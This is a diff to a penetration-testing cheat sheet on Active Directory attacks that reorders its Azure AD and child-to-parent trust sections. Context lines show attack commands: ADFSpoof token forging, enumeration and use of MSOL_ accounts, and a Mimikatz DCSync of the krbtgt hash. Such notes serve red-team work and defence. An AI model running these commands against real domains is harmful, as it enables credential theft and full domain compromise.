@@ -65,9 +65,9 @@
 * [Microsoft System Center Configuration Manager SCCM](#SCCM)
 * [Active Directory Federation Services](#ADFS)
 * [Pre Windows 2000 Computers](#Pre-Windows-2000-Computers)
+* [Azure AD](#Azure-AD)
 * [Child to Parent](#Child-to-Parent)
   * [Kerberos](#Kerberos)
-  * [Azure AD](#Azure-AD)
   * [SQL Server](#SQL-Server)
   * [Trust key](#Trust-key)
   * [Krbtgt hash](#Krbtgt-hash)
@@ -2314,11 +2314,6 @@ python3 ADFSpoof.py -b TKSKey.bin DKMkey.bin -s adfs.<DOMAIN>.local saml2 --endp
 ## Pre Windows 2000 computers
 - Check the [Initial Access page](Initial-Access.md#pre-windows-2000-computers)
 
-## Child to Parent
-### Kerberos
-- Anything related to Kerberos and users/groups etc could be performed from child to parent. Things like Roasting, password in description, anything related to attributes, ACL's etc etc!
-- Use the `-Domain` flag in PowerView to query stuff cross domain/forest.
-
 ### Azure AD
 #### Enumerate where PHS AD connect is installed
 ```
@@ -2326,9 +2321,7 @@ Get-DomainUser -Identity "MSOL_*" -Domain <DOMAIN>
 ```
 
 #### On the AD connect server extract MSOL_ Credentials
-```
-.\adconnect.ps1
-```
+- [Azure page](/cloud/azure/Cloud-OnPrem-lateral-movement.md#azure-ad-connect)
 
 #### Run cmd as MSOL_
 ```
@@ -2340,6 +2333,11 @@ runas /user:<DOMAIN>\<USER> /netonly cmd
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
+
+## Child to Parent
+### Kerberos
+- Anything related to Kerberos and users/groups etc could be performed from child to parent. Things like Roasting, password in description, anything related to attributes, ACL's etc etc!
+- Use the `-Domain` flag in PowerView to query stuff cross domain/forest.
 
 ### Trust key
 - Abuses SID History
